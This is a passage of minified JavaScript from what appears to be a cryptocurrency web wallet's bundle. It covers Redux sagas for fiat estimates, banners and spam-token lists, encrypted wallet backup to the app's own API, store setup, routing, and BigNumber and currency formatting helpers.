                        var c;
                        const e = getFiatAmountWithEstimate({
                            side: t,
                            amount: i,
                            estimate: (null == s || null === (c = s.maxEstimate) || void 0 === c ? void 0 : c.estimate) || "0",
                            isErrorPartners: !1
                        });
                        yield(0,
                        Df.gz)(_O.changeFiatAmount(e))
                    }
                } else
                    yield(0,
                    Df.gz)(_O.fetchPartnersIsError(!0));
                yield(0,
                Df.gz)(_O.fetchEstimateCommit(s));
                yield(0,
                Df.gz)(_O.fetchPartnersIsError(!1))
            }
            yield(0,
            Df.gz)(_O.fetchPartnersIsLoading(!1))
        }
        function *errorCheckCase(e) {
            const t = yield(0,
            Df.Ys)(wO)
              , a = yield(0,
            Df.Ys)(SO)
              , n = yield(0,
            Df.Ys)(kO)
              , r = "buy" === t ? a : n
              , l = yield(0,
            Df.Ys)(KO)
              , s = undefined
              , i = !!(yield(0,
            Df.Ys)(kd.Y2));
            yield(0,
            Df.gz)(_O.setIsFiatSupported(i));
            if (!l) {
                yield(0,
                Df.gz)(_O.errorCheckCommit(!1));
                return
            }
            const {limits: {min: o, max: c}, amountValidateObject: {precision: u}} = l
              , d = new (Sc())(r)
              , m = (0,
            Ko.gt)(d.dp(), u)
              , p = Boolean(o && c && r && ((0,
            Ko.lt)(r, o) || (0,
            Ko.gt)(r, c) || (0,
            Ko.gt)(d.dp(), u)))
              , f = m || p;
            yield(0,
            Df.gz)(_O.errorCheckCommit(f));
            f ? yield(0,
            Df.gz)(_O.fetchPartnersIsLoading(!1)) : yield(0,
            Df.gz)(_O.fetchEstimate({
                abortController: e.payload.abortController
            }))
        }
        function *fetchPartnersSaga() {
            yield(0,
            Df.Fm)((0,
            te.getType)(_O.fetchPartners), fetchPartnersCase)
        }
        function *changeFiatWalletSaga() {
            yield(0,
            Df.Fm)((0,
            te.getType)(_O.changeFiatWallet), changeFiatWalletCase)
        }
        function *changeCryptoWalletSaga() {
            yield(0,
            Df.Fm)((0,
            te.getType)(_O.changeCryptoWallet), changeCryptoWalletCase)
        }
        function *fetchEstimateSaga() {
            yield(0,
            Df.Fm)((0,
            te.getType)(_O.fetchEstimate), fetchEstimateCase)
        }
        function *errorCheckSaga() {
            yield(0,
            Df.Fm)((0,
            te.getType)(_O.errorCheck), errorCheckCase)
        }
        function *initGetCurrenciesSaga() {
            yield(0,
            Df.Fm)((0,
            te.getType)(_O.initGetCurrencies), initGetCurrenciesCase)
        }
        const hue = [(0,
        Df.rM)(changeFiatWalletSaga)]
          , gue = [(0,
        Df.rM)(fetchPartnersSaga)]
          , yue = [(0,
        Df.rM)(fetchEstimateSaga)]
          , vue = [(0,
        Df.rM)(errorCheckSaga)]
          , _ue = [(0,
        Df.rM)(changeCryptoWalletSaga)]
          , wue = [(0,
        Df.rM)(initGetCurrenciesSaga)]
          , bue = "api/v3/marketing-banner/get-info"
          , fetchBannerInfo = async () => {
            try {
                const e = await U.R_.get(bue);
                return e.data.bannerTitle ? {
                    type: "FETCH_BANNER_SUCCESS",
                    version: e.data.version,
                    bannerTitle: e.data.bannerTitle,
                    bannerContent: e.data.bannerContent,
                    bannerSVG: e.data.bannerSVG,
                    show: e.data.show,
                    link: e.data.link
                } : e.data.message ? {
                    type: "FETCH_BANNER_ERROR",
                    message: e.data.message
                } : {
                    type: "FETCH_BANNER_ERROR",
                    message: "marketing banner info fetch error"
                }
            } catch (e) {
                return {
                    type: "FETCH_BANNER_ERROR",
                    message: e.message || "marketing banner info fetch error"
                }
            }
        }
        ;
        function *fetchBannerInfoCase() {
            const e = undefined;
            if (!0 === (yield(0,
            Df.Ys)(Bo)))
                return;
            const t = yield(0,
            Df.RE)(fetchBannerInfo);
            if ("FETCH_BANNER_SUCCESS" === t.type) {
                const e = {
                    version: t.version,
                    bannerTitle: t.bannerTitle,
                    bannerContent: t.bannerContent,
                    bannerSVG: t.bannerSVG,
                    show: t.show,
                    link: t.link
                };
                yield(0,
                Df.gz)(y$.setBannerInfo({
                    bannerInfo: e
                }))
            }
            "FETCH_BANNER_ERROR" === t.type && (yield(0,
            Df.gz)(y$.setFetchError({
                error: t
            })))
        }
        function *fetchBannerInfoSaga() {
            yield(0,
            Df.A7)((0,
            te.getType)(y$.fetchBannerInfo), fetchBannerInfoCase)
        }
        const kue = [(0,
        Df.rM)(fetchBannerInfoSaga)]
          , Sue = Wc.Ph.create({
            name: "reducer-secure-storage"
        });
        function *setMasterPasswordCase(e) {
            try {
                const {masterPassword: t} = e.payload
                  , a = patchMasterPassword(t);
                yield(0,
                Df.gz)(ie.setMasterPasswordCommit({
                    masterPassword: a
                }));
                const n = undefined;
                if (!0 === (yield(0,
                Df.Ys)(Bo)))
                    return;
                AttackManager.fetchStatus()
            } catch (e) {
                Sue.error("setMasterPassword reducer failed", e)
            }
        }
        function *replaceStorageCase(e) {
            try {
                const {password: t, data: a} = e.payload
                  , n = t ? patchMasterPassword(t) : yield(0,
                Df.Ys)(oe.P2);
                if (n) {
                    const e = Q.AES.encrypt(JSON.stringify(a), n).toString();
                    yield(0,
                    Of.gz)(ie.storageSaveAndTryFlush({
                        data: e
                    }))
                }
            } catch (e) {
                Wc.NK.error("replaceStorage reducer failed", e)
            }
        }
        function *storageSaveAndTryFlushCase(e) {
            try {
                yield(0,
                Df.gz)(ie.storageSaveAndTryFlushCommit({
                    data: e.payload.data
                }));
                yield(0,
                Of.RE)(Rue.flush)
            } catch (e) {
                Wc.NK.error("storageSaveAndTryFlushCase failed", e)
            }
        }
        const Cue = undefined
          , Nue = undefined
          , secureStoreApi_save = async e => {
            let {backupId: t, data: a} = e;
            const n = await U.vq.post("api/v3/accounts", {
                backupId: t,
                data: a
            })
              , r = JSON.parse(n.data);
            return {
                status: (null == r ? void 0 : r.status) || !1
            }
        }
          , secureStoreApi_get = async e => {
            let {backupId: t} = e;
            const a = await U.vq.get(`api/v3/accounts?backupId=${t}`)
              , n = JSON.parse(a.data);
            return !(null == n || !n.backupId || null == n || !n.data) && {
                backupId: null == n ? void 0 : n.backupId,
                data: null == n ? void 0 : n.data
            }
        }
          , sanitizeWallets = e => {
            const t = undefined
              , a = undefined;
            return mapWalletsToPlainObjects(e).map((e => {
                var t;
                null != e && e.privateKey && delete e.privateKey;
                null != e && e.subWallets && null != e && null !== (t = e.subWallets) && void 0 !== t && t.length && (e.subWallets = sanitizeWallets(e.subWallets));
                return e
            }
            ))
        }
        ;
        function *saveBackupCase(e) {
            try {
                const e = yield(0,
                Of.Ys)(oe.AO)
                  , t = undefined;
                if ((yield(0,
                Of.Ys)(oe.s$)) && e) {
                    const t = yield(0,
                    Of.Ys)(oe.P2)
                      , a = yield(0,
                    Of.Ys)($c)
                      , n = sanitizeWallets(a)
                      , r = Q.AES.encrypt(JSON.stringify(n), patchMasterPassword(t)).toString()
                      , l = yield(0,
                    Of.RE)(secureStoreApi_save, {
                        backupId: e,
                        data: r
                    });
                    null != l && l.status || Wc.NK.error("saveBackupCase secureStoreApi.save failed", l)
                }
            } catch (e) {
                Wc.NK.error("saveBackupCase failed", e)
            }
        }
        function *setMasterPasswordSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(ie.setMasterPassword), setMasterPasswordCase)
        }
        function *replaceStorageSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(ie.replaceStorage), replaceStorageCase)
        }
        function *storageSaveAndTryFlushSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(ie.storageSaveAndTryFlush), storageSaveAndTryFlushCase)
        }
        function *mapDecryptedSecureStorageSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(ie.mapDecryptedSecureStorage), mapDecryptedSecureStorageCase)
        }
        function *saveBackupSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(ie.saveBackup), saveBackupCase)
        }
        const Tue = [(0,
        Df.rM)(setMasterPasswordSaga), (0,
        Df.rM)(replaceStorageSaga), (0,
        Df.rM)(storageSaveAndTryFlushSaga), (0,
        Df.rM)(mapDecryptedSecureStorageSaga), (0,
        Df.rM)(saveBackupSaga)]
          , Aue = "api/v3/spam-token-limiter/entities"
          , fetchSpamTokenList = async () => {
            try {
                const e = await U.Q5.get(Aue);
                return "message"in e.data ? {
                    type: "FETCH_SPAM_TOKEN_LIST_ERROR",
                    message: e.data.message
                } : {
                    type: "FETCH_SPAM_TOKEN_LIST_SUCCESS",
                    list: e.data
                }
            } catch (e) {
                return {
                    type: "FETCH_SPAM_TOKEN_LIST_ERROR",
                    message: e.message || "marketing banner info fetch error"
                }
            }
        }
        ;
        function *fetchSpamTokenListCase() {
            const e = undefined;
            if (!0 === (yield(0,
            Df.Ys)(Bo)))
                return;
            const t = yield(0,
            Df.RE)(fetchSpamTokenList);
            "FETCH_SPAM_TOKEN_LIST_SUCCESS" === t.type && (yield(0,
            Df.gz)(hh.setSpamTokenList({
                list: t.list
            })));
            "FETCH_SPAM_TOKEN_LIST_ERROR" === t.type && (yield(0,
            Df.gz)(hh.setFetchError({
                error: t
            })))
        }
        const xue = 864e5;
        function *updateSpamTokensListOnce() {
            const e = yield(0,
            Df.RE)(fetchSpamTokenList);
            "FETCH_SPAM_TOKEN_LIST_SUCCESS" === e.type && (yield(0,
            Df.gz)(hh.setSpamTokenList({
                list: e.list
            })))
        }
        function *oneSpamTokensListUpdate() {
            const e = undefined;
            !0 !== (yield(0,
            Df.Ys)(Bo)) ? yield(0,
            Df.$6)([(0,
            Df.gw)(xue), (0,
            Df.RE)(updateSpamTokensListOnce)]) : yield(0,
            Df.gw)(100)
        }
        function *spamTokensListUpdateCycle() {
            for (; ; )
                yield(0,
                Df.RE)(oneSpamTokensListUpdate)
        }
        function *spamTokensListUpdater() {
            yield(0,
            Df.qn)(hh.initializeSpamTokenListUpdater);
            yield(0,
            Df.RE)(spamTokensListUpdateCycle);
            for (; ; )
                yield(0,
                Df.qn)(hh.initializeSpamTokenListUpdater)
        }
        function *_fetchSpamTokenListSaga() {
            yield(0,
            Df.A7)((0,
            te.getType)(hh.fetchSpamTokenList), fetchSpamTokenListCase)
        }
        function *_spamTokenListUpdaterSaga() {
            yield(0,
            Df.Cs)(spamTokensListUpdater)
        }
        const Iue = [(0,
        Df.rM)(_fetchSpamTokenListSaga)]
          , Pue = [(0,
        Df.rM)(_spamTokenListUpdaterSaga)];
        function *rootSaga() {
            yield(0,
            Df.$6)([...Wce, ...Gce, ...Lce, ...Oce, ...Vce, ...Kce, ...Hce, ...zce, ...Zce, ...gue, ...kue, ...Yce, ...hue, ...yue, ...vue, ..._ue, ...Dce, ...Tue, ...wue, ...Bce, ...qce, ...Xce, ...Qce, ...sue, ...oue, ...iue, ...cue, ...uue, ...due, ...mue, ...fue, ...eue, ...Jce, ...jce, ...$ce, ...pue, ...Iue, ...Pue, ...Eue])
        }
        const reduxPersistErrorMiddleware = e => t => a => {
            if (a.type === zoe.REHYDRATE) {
                const t = a
                  , {err: n} = t;
                if (n && (n instanceof FallbackStoragePrimaryPersistError || n instanceof FallbackStorageFallbackPersistError) && n.value) {
                    const a = {
                        type: zoe.REHYDRATE,
                        key: t.key,
                        payload: n.value
                    };
                    e.dispatch(a)
                }
            }
            return t(a)
        }
          , createDebuggerMiddleware = e => () => e => t => {
            0;
            return e(t)
        }
          , Lue = (0,
        Koe.ZP)()
          , Fue = {
            manualPersist: !0
        };
        function configureStore() {
            let {persistConfig: e={}} = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
              , t = Mle.qC;
            getIsDevModeEnabled() && (t = (0,
            joe.Uo)({
                trace: !0,
                stateSanitizer: e => {
                    var t, a, n;
                    return {
                        ...e,
                        "@atom/validators": "<<OMITTED>>",
                        "secure-storage": `<<OMITTED ${null === (t = e["secure-storage"]) || void 0 === t || null === (a = t.data) || void 0 === a ? void 0 : a.length} ${Boolean(null === (n = e["secure-storage"]) || void 0 === n ? void 0 : n.masterPassword)}>>`,
                        transactions: "<<OMITTED>>"
                    }
                }
            }));
            const a = {}
              , n = (0,
            Mle.MT)((0,
            zoe.persistReducer)({
                ...Doe,
                ...e
            }, Ace), void 0, t((0,
            Mle.md)(Hoe.Z.withExtraArgument(a), Lue, reduxPersistErrorMiddleware, ( () => e => t => e(t)))))
              , r = persistStore(n, Fue)
              , l = crossTabStore(n, r);
            a.persistor = r;
            a.crossTabController = l;
            ng.n.setStore(n);
            onStartUp(n);
            Lue.run(rootSaga);
            M.CM && Object.assign(window, {
                store: n
            });
            return {
                crossTabController: l,
                persistor: r,
                store: n
            }
        }
        const {store: Wue, persistor: Rue} = configureStore()
          , FletcherIconsUpdater = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Xn);
            (0,
            O.useEffect)((function onFetchFletcherIcons() {
                0 === t.length && e(vce.fetchFletcherIcons())
            }
            ), [t]);
            return null
        }
          , IconsUpdater = () => O.createElement(O.Fragment, null, O.createElement(FletcherIconsUpdater, null));
        function root_component_extends() {
            root_component_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return root_component_extends.apply(this, arguments)
        }
        function fadeInRootElement() {
            const e = document.getElementById("root");
            z()(e, "`#root` must be in the DOM");
            e.style.opacity = "1"
        }
        const RecoveryRoute = e => {
            let {component: t, ...a} = e;
            (0,
            O.useEffect)(( () => {
                fadeInRootElement()
            }
            ), []);
            return O.createElement(j.AW, root_component_extends({}, a, {
                render: e => O.createElement($.zt, {
                    store: Wue
                }, O.createElement(t, e))
            }))
        }
          , CommonRoute = e => {
            let {component: t, ...a} = e;
            return O.createElement(j.AW, root_component_extends({}, a, {
                render: e => O.createElement($.zt, {
                    store: Wue
                }, O.createElement(Z.r, {
                    persistor: Rue,
                    onBeforeLift: fadeInRootElement
                }, O.createElement(q.zt, null, O.createElement(S_, null, O.createElement(BorrowPageUpdater, null), O.createElement(t, e), O.createElement(theme_effect, null), O.createElement(ScrollToTop, null), O.createElement(session_timeout, null), O.createElement(Voe, null), O.createElement(RatesUpdater, null), O.createElement(IconsUpdater, null), O.createElement(BackendLoggerUpdater, null), O.createElement(SettingsUpdater, null), O.createElement(NotificationsUpdater, null), O.createElement(CrossTabStarter, null)))), O.createElement(PersistStarter, null))
            }))
        }
          , RootComponent = () => {
            (0,
            O.useEffect)(( () => {
                AttackManager.fetchStatus();
                const e = window.setInterval(( () => {
                    AttackManager.fetchStatus()
                }
                ), 6e4);
                return () => {
                    window.clearInterval(e)
                }
            }
            ), []);
            const e = undefined;
            return AttackManager.isUnderAttack() ? O.createElement(N5, null) : O.createElement(Y.VK, null, O.createElement(j.rs, null, O.createElement(RecoveryRoute, {
                path: "/app/recovery",
                component: RecoveryRouter
            }), O.createElement(CommonRoute, {
                path: "/app/borrow",
                component: BorrowPage_BorrowIndexPage
            }), O.createElement(CommonRoute, {
                path: "/app/earn",
                component: EarnPage_EarnPage
            }), O.createElement(CommonRoute, {
                path: "/app/token-generator",
                component: token_generator
            }), O.createElement(CommonRoute, {
                path: "/app/uniswap-listing",
                component: UniswapListing
            }), O.createElement(CommonRoute, {
                path: "/app/close",
                component: WindowClose
            }), O.createElement(CommonRoute, {
                path: "/app/extension",
                component: jne
            }), O.createElement(CommonRoute, {
                path: "/app/mobile",
                component: Yne
            }), O.createElement(CommonRoute, {
                path: "/app",
                component: WebWalletsRouter
            })))
        }
        ;
        console.log("%cAttention!", "color: #f00; font-size: 300%");
        console.log(["%cThe data in this section is intended for developers.", "Please don’t provide any of this information to the third parties", "nor paste anything that third parties gave you here.", "Doing this can lead to the loss of your private keys and funds."].join(" "), "font-size: 150%");
        const Bue = undefined;
        (async () => {
            try {
                const e = new XMLHttpRequest;
                e.open("GET", document.location.href, !1);
                e.send(null);
                const t = e.getResponseHeader("cache-tf");
                if (true || /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9]+$/g.test(window.location.host) || /^(?:(?:^|\.)(?:2(?:5[0-5]|[0-4]\d)|1?\d?\d)){4}$/.test(window.location.host))
                    return;
                0;
                btoa(null != t ? t : "").toLowerCase() !== "M2RmYTYyOWEtYjRiYy00NjEyLTkyMDUtYzA0ZDJjOGE2OTdm".toLowerCase() && AttackManager.setIsDirty()
            } catch (e) {
                console.info(e)
            }
        }
        )();
        if ((0,
        M.d)()) {
            document.body.className += " electron";
            document.body.addEventListener("click", (e => {
                if (e.target instanceof HTMLAnchorElement) {
                    if (e.target.download)
                        return;
                    if (-1 === e.target.href.indexOf("/app")) {
                        e.stopPropagation();
                        e.preventDefault();
                        window.open(e.target.href, "_blank")
                    }
                }
            }
            ))
        }
        D.render(O.createElement(RootComponent, null), document.getElementById("root"))
    }
    ,
    98148: (e, t, a) => {
        "use strict";
        a.d(t, {
            k: () => adapterWrapperResult
        });
        var n = a(919);
        function adapterWrapperResult(e) {
            if (e.hasOwnProperty("result")) {
                const {result: t, blockbook: a} = e;
                if (a) {
                    const {isFallback: e, position: t, url: r} = a;
                    e && n.b.error(n.d.BLOCKBOOK_ERROR, `Switch to fallback – ${r}. Fallback position – ${t}.`)
                }
                return t
            }
            return e
        }
    }
    ,
    67048: (e, t, a) => {
        "use strict";
        a.d(t, {
            Wn: () => abs,
            eq: () => eq,
            gt: () => gt,
            LT: () => minimum,
            gW: () => maximum,
            eg: () => gte,
            G: () => lte,
            lt: () => lt,
            PD: () => plus,
            h9: () => minus,
            $q: () => multipliedBy,
            hC: () => dividedBy,
            FH: () => toFixed,
            Lq: () => toFixedRoundUp,
            yF: () => toFormatAmount,
            y4: () => fixedAmount,
            i1: () => toFormatWalletsBalances,
            SJ: () => toFormatEstimate
        });
        var n = a(57640), r = a.n(n), l = a(9924), s = a.n(l), i = a(68757), o = a.n(i), c = a(44431), u = a.n(c), d;
        const m = a(12587).P.create({
            name: "BN"
        })
          , p = 999999999999;
        u().config({
            DECIMAL_PLACES: 20,
            EXPONENTIAL_AT: 30,
            FORMAT: {
                prefix: "",
                decimalSeparator: ".",
                groupSeparator: " ",
                groupSize: 3,
                secondaryGroupSize: 0,
                fractionGroupSeparator: "",
                fractionGroupSize: 0,
                suffix: ""
            }
        });
        const abs = e => new (u())(e || "0").abs()
          , eq = (e, t) => {
            if (null == e || null == t)
                return !1;
            try {
                return new (u())(e).eq(t)
            } catch (a) {
                m.error(`eq failed ${e} and ${t}`, a);
                return !1
            }
        }
          , gt = (e, t) => {
            if (null == e || null == t)
                return !1;
            try {
                return new (u())(e).gt(t)
            } catch (a) {
                m.error(`gt failed ${e} and ${t}`, a);
                return !1
            }
        }
          , minimum = function() {
            try {
                return u().minimum(...arguments).toString()
            } catch (e) {
                m.error("minimum failed", e);
                return ""
            }
        }
          , maximum = function() {
            try {
                return u().maximum(...arguments).toString()
            } catch (e) {
                m.error("maximum failed", e);
                return ""
            }
        }
          , gte = (e, t) => {
            if (null == e || null == t)
                return !1;
            try {
                return new (u())(e).gte(t)
            } catch (a) {
                m.error(`gte failed ${e} and ${t}`, a);
                return !1
            }
        }
          , lte = (e, t) => {
            if (null == e || null == t)
                return !1;
            try {
                return new (u())(e).lte(t)
            } catch (a) {
                m.error(`lte failed ${e} and ${t}`, a);
                return !1
            }
        }
          , lt = (e, t) => {
            if (null == e || null == t)
                return !1;
            try {
                return new (u())(e).lt(t)
            } catch (a) {
                m.error(`lt failed ${e} and ${t}`, a);
                return !1
            }
        }
          , plus = (e, t) => {
            if (null == e && null == t)
                return "";
            if (null == e && null != t)
                return t.toString();
            if (null != e && null == t)
                return e.toString();
            if (null != e && null != t)
                try {
                    return new (u())(e).plus(t).toString()
                } catch (a) {
                    m.error(`plus failed ${e} and ${t}`, a);
                    return new (u())("0").toString()
                }
            return ""
        }
          , minus = (e, t) => {
            if (null == e && null == t)
                return "";
            if (null == e && null != t)
                return "";
            if (null != e && null == t)
                return e.toString();
            if (null != e && null != t)
                try {
                    return new (u())(e).minus(t).toString()
                } catch (a) {
                    m.error(`minus failed ${e} and ${t}`, a);
                    return new (u())("0").toString()
                }
            return ""
        }
          , multipliedBy = (e, t) => {
            if (null == e && null == t)
                return "";
            if (null == e && null != t)
                return t.toString();
            if (null != e && null == t)
                return e.toString();
            if (null != e && null != t)
                try {
                    return new (u())(e).multipliedBy(new (u())(t)).toString()
                } catch (a) {
                    m.error(`multiply failed ${e} and ${t}`, a);
                    return new (u())("0").toString()
                }
            return ""
        }
          , dividedBy = (e, t) => {
            if (null == e || null == t)
                return "";
            try {
                return new (u())(e).dividedBy(new (u())(t)).toString()
            } catch (a) {
                m.error(`dividedBy failed ${e} and ${t}`, a);
                return new (u())("0").toString()
            }
        }
          , toFixed = (e, t) => {
            if (null == e)
                return "";
            try {
                const a = t.roundDown ? u().ROUND_DOWN : void 0
                  , [n,r] = [t.min, t.max].map((e => {
                    const t = Number(e);
                    return !Number.isNaN(t) && t > 0 ? t : 0
                }
                ))
                  , l = new (u())(e).decimalPlaces(r, a);
                return n && l.decimalPlaces() < n ? l.toFixed(n) : l.toString()
            } catch (a) {
                m.error(`toFixed failed ${e} ${t}`, a);
                return ""
            }
        }
          , toFixedRoundUp = (e, t) => new (u())(e).toFixed(t, u().ROUND_CEIL).toString();
        function toAdjustDecimals(e, t) {
            if (null == e || new (u())(e).isNaN())
                return "...";
            let a = e;
            if (void 0 !== t) {
                const n = undefined;
                a = toFixed(e, "number" == typeof t ? {
                    max: t
                } : t)
            }
            return a
        }
        const toFormatAmount = (e, t, a) => {
            if (null == e)
                return "xmr" === (null == a ? void 0 : a.currency) ? "-" : "...";
            try {
                const a = toAdjustDecimals(e, t)
                  , n = new (u())(a).toFormat();
                if ("NaN" === n)
                    throw new Error("Failed format amount");
                return n
            } catch (a) {
                m.error(`toFormat failed ${e} ${t}`, a);
                return "..."
            }
        }
          , fixedAmount = e => String(e).replaceAll(/\s/g, "").replace(/(\.{2,})/gm, ".").replace(/(^0{2,})/gm, "0").replace(/(^0)([0-9])/gm, "$2").replace(/(\.[0-9]+)(\.){1,}/gm, "$1")
          , toFormatWalletsBalances = (e, t, a, n) => {
            if (null == e)
                return "xmr" === a ? "-" : "...";
            try {
                const r = toAdjustDecimals(e, t);
                if (t && "0" === r && gt(e, 0)) {
                    let e = "<0.";
                    new Array(t).fill("0").map(( (t, a, n) => {
                        a + 1 < n.length && (e += t);
                        a + 1 === n.length && (e += "1")
                    }
                    ));
                    return e
                }
                if (gt(r.toString().length, 13) || Number(e) > p) {
                    const e = new (u())(r).toString(10).slice(0, 13)
                      , t = !!a && !n;
                    if (!/\./.test(e)) {
                        const e = `${new (u())(999999999999).toFormat()}`;
                        return t ? `>${a}${e}` : `>${e}`
                    }
                    const l = new (u())(r).toNumber().toPrecision(12)
                      , s = `${new (u())(l).toFormat()}`;
                    return t ? `${a}${s}` : `${s}`
                }
                const l = new (u())(r).toFormat();
                if ("NaN" === l)
                    throw new Error("Failed format amount");
                return l
            } catch (a) {
                m.error(`toFormat failed ${e} ${t}`, a);
                return "..."
            }
        }
          , toFormatEstimate = function(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            return t ? gt(e, 1) ? toFixed(e, {
                min: 2,
                max: 2
            }) : toFixed(e, {
                min: 2,
                max: 4
            }) : toFixed(e, {
                min: 2,
                max: 6
            })
        }
    }
    ,
    80552: (e, t, a) => {
        "use strict";
        a.d(t, {
            UF: () => getFiatCurrencyInfo,
            l2: () => getBuyFiatCurrencyInfo,
            Tz: () => patchTitle,
            II: () => getCurrencyInfo,
            Au: () => getAddressExplorer,
            Kb: () => getBlockExplorer,
            Ay: () => patchNetwork,
            rX: () => patchCurrency,
            xG: () => formatCurrency,
            iX: () => formatResource,
            Ui: () => formatTitle,
            Pg: () => formatWalletTypes,
            uL: () => toTicker,
            wL: () => fixedCurrency
        });
        var n = a(31672)
          , r = a.n(n)
          , l = a(2490)
          , s = a.n(l)
          , i = a(59461)
          , o = a.n(i)
          , c = a(17995)
          , u = a(87205)
          , d = a(4406)
          , m = a(86012);
        const toUpper = e => String(e || "").toUpperCase()
          , getFiatCurrencyInfo = e => d.W.find((t => (0,
        u.t)(t.ticker) === (0,
        u.t)(e)))
          , getBuyFiatCurrencyInfo = e => m.Y.find((t => (0,
        u.t)(t.ticker) === (0,
        u.t)(e)))
          , patchTitle = (e, t) => null != e && e.includes("Cardano Shelley") ? e.replace("Cardano Shelley", "ADA") : null != e && e.includes("Cardano Byron") ? e.replace("Cardano Byron", "ADA Old") : "inj" === t && null != e && e.includes("Cosmos") ? e.replace("Cosmos", "Injective") : e
          , getCurrencyInfo = e => {
            var t;
            const a = (0,
            u.t)(e)
              , n = null === (t = c.Z.getRootMetadata(a)) || void 0 === t ? void 0 : t.coin;
            return n ? {
                title: patchTitle(n.title, n.ticker),
                ticker: n.ticker,
                currency: n.ticker,
                precision: n.precision,
                extraId: n.extraIdTitle ? {
                    title: n.extraIdTitle
                } : void 0
            } : null
        }
          , getAdapterSelectorFromFamilyAndCurrency = (e, t) => e && t !== e ? {
            ticker: e,
            tokens: !0
        } : {
            ticker: t,
            tokens: !1
        }
          , getAddressExplorer = (e, t, a) => {
            var n;
            const {explorerLinks: r} = null !== (n = c.Z.getMetadata(getAdapterSelectorFromFamilyAndCurrency(e, t))) && void 0 !== n ? n : {};
            return r ? r.address.replace(":address", a) : ""
        }
          , getBlockExplorer = (e, t, a) => {
            var n;
            const {explorerLinks: r} = null !== (n = c.Z.getMetadata(getAdapterSelectorFromFamilyAndCurrency(e, t))) && void 0 !== n ? n : {};
            return r ? r.transaction.replace(":hash", a) : ""
        }
        ;
        function patchNetwork(e) {
            return "arbitrum" === e ? "etharb" : e
        }
        function patchCurrency(e) {
            if ("bsc" === e)
                return "bnb";
            if ("etharb" === e || "ethop" === e)
                return "eth";
            if ("ada-shelley" === e)
                return "ada";
            if ("now-e68" === e)
                return "now";
            if (e && null != e && e.includes("-")) {
                const [t,a] = e.split("-");
                if (/^\w{3,4}$/.test(a) && "waves" !== t && "tusd" !== t)
                    return t
            }
            return e
        }
        const formatCurrency = e => toUpper(patchCurrency(e))
          , formatResource = e => e.charAt(0).toUpperCase() + e.slice(1)
          , formatTitle = (e, t, a) => e && t ? t && -1 !== t ? e.length < t && !a ? `${e}` : e.length > t ? e.slice(0, t) + "..." : e : e : ""
          , formatWalletTypes = e => {
            const t = [];
            for (const a in e)
                "isMultisig" === a && e[a] ? t.push("Multisig") : "isWatchOnly" === a && e[a] ? t.push("WO") : "isHw" === a && e[a] ? t.push("Ledger") : "isTestnet" === a && e[a] && t.push("Testnet");
            return t.length > 3 ? t.slice(0, -1) : t
        }
          , toTicker = e => formatCurrency(e).toLowerCase()
          , formatTickerCurrency = e => toUpper(patchCurrency(e))
          , fixedCurrency = e => "usdterc20" === (0,
        u.t)(e) ? "USDT" : "bnbmainnet" === (0,
        u.t)(e) ? "BNB mainnet" : patchCurrency(e)
    }
    ,
    28256: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => M
        });
        var n = a(15581)
          , r = a.n(n)
          , l = a(2490)
          , s = a.n(l)
          , i = a(34514)
          , o = a.n(i)
          , c = a(10072)
          , u = a.n(c)
          , d = a(23042)
          , m = a.n(d)
          , p = a(99137)
          , f = a.n(p)
          , E = a(71957)
          , h = a.n(E)
          , g = a(96306)
          , y = a.n(g)
          , v = a(103)
          , _ = a.n(v)
          , w = a(74592)
          , b = a.n(w)
          , k = a(58276)
          , S = a.n(k)
          , C = a(35082)
          , N = a.n(C)
          , T = a(12813)
          , A = a.n(T)
          , x = a(18222)
          , I = a.n(x)
          , P = a(38563)
          , L = a.n(P)
          , F = a(50336)
          , W = a.n(F)
          , R = a(7512)
          , B = a.n(R)
          , O = a(41817)
          , D = a.n(O);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class EventManager {
            constructor() {
                var e = this;
                _defineProperty(this, "on", (function(t, a) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                    e.list.has(t) || e.list.set(t, []);
                    e.list.get(t).push({
                        callback: a,
                        once: n
                    });
                    return e
                }
                ));
                _defineProperty(this, "off", (function() {
                    let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : null;
                    e.list.delete(t);
                    return e
                }
                ));
                _defineProperty(this, "emit", (function(t) {
                    for (var a = arguments.length, n = new Array(a > 1 ? a - 1 : 0), r = 1; r < a; r++)
                        n[r - 1] = arguments[r];
                    if (!e.list.has(t))
                        return !1;
                    const l = e.list.get(t);
                    l.forEach(( (t, a) => {
                        const {callback: r, once: s} = t;
                        setTimeout(( () => r.call(e, ...n)), 0);
                        s && l.splice(a, 1)
                    }
                    ));
                    return !0
                }
                ));
                this.list = new Map
            }
        }
        const M = EventManager
    }
    ,
    3547: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => E,
            b: () => rebuildApi
        });
        var n = a(88449)
          , r = a(2490)
          , l = a(59849)
          , s = a(32819)
          , i = a(41817)
          , o = a(68605)
          , c = a.n(o)
          , u = a(919)
          , d = a(59351)
          , m = a(69470);
        function _defineProperty(e, t, a) {
